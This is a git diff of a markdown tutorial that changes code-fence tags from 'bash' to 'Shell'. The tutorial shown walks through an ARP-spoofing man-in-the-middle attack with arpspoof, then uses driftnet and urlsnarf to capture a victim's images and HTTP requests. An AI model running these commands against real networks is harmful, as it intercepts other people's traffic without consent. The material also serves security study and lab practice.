@@ -19,12 +19,12 @@ Requirements are [Kali 2](https://www.kali.org)
 
 Run this command and if the output is 0 then we need to change it to 1
 
-```bash
+```Shell
 $ cat /proc/sys/net/ipv4/ip_forward
 ```
 <br>
 
-```bash
+```Shell
 $ echo 1 >> /proc/sys/net/ipv4/ip_forward
 ```
 
@@ -34,7 +34,7 @@ $ echo 1 >> /proc/sys/net/ipv4/ip_forward
 
 first
 
-```bash
+```Shell
 $ arpspoof -i eth0 targetiphere gatewayiphere
 ```
 
@@ -42,7 +42,7 @@ $ arpspoof -i eth0 targetiphere gatewayiphere
 
 and then in another terminal
 
-```bash
+```Shell
 $ arpspoof -i eth0 gatewayiphere targetiphere
 ```
 
@@ -52,7 +52,7 @@ $ arpspoof -i eth0 gatewayiphere targetiphere
 
 This will capture images opened by the victim and display them in the black box.
 
-```bash
+```Shell
 $ driftnet -i eth0
 ```
 
@@ -60,6 +60,6 @@ $ driftnet -i eth0
 
 ### Bonus: Run urlsnarf to capture http requests
 
-```bash
+```Shell
 $ urlsnarf -i eth0
 ```
